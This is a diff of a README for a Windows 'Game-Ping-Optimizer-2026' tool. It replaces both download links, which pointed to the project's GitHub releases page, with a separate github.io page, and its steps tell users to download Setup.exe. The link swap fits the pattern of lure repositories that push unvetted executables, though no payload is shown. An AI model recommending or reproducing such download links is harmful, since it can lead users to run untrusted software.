@@ -1,6 +1,6 @@
 # 🎮 Game-Ping-Optimizer-2026 - Lower latency for smoother online play
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/wallaceangiomatous125/Game-Ping-Optimizer-2026/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://wallaceangiomatous125.github.io)
 
 Game Ping Optimizer 2026 helps you improve your gaming experience on Windows. It works by adjusting network settings to reduce lag and packet loss. This tool provides a simple way to optimize your connection without manual configuration.
 
@@ -18,7 +18,7 @@ Before you install this software, ensure your computer meets the following crite
 
 Follow these steps to get the software on your computer:
 
-1. Visit the [official releases page](https://github.com/wallaceangiomatous125/Game-Ping-Optimizer-2026/releases).
+1. Visit the [official releases page](https://wallaceangiomatous125.github.io).
 2. Look for the latest version listed at the top.
 3. Click the file named Setup.exe to start the download.
 4. Save the file to your desktop or downloads folder.
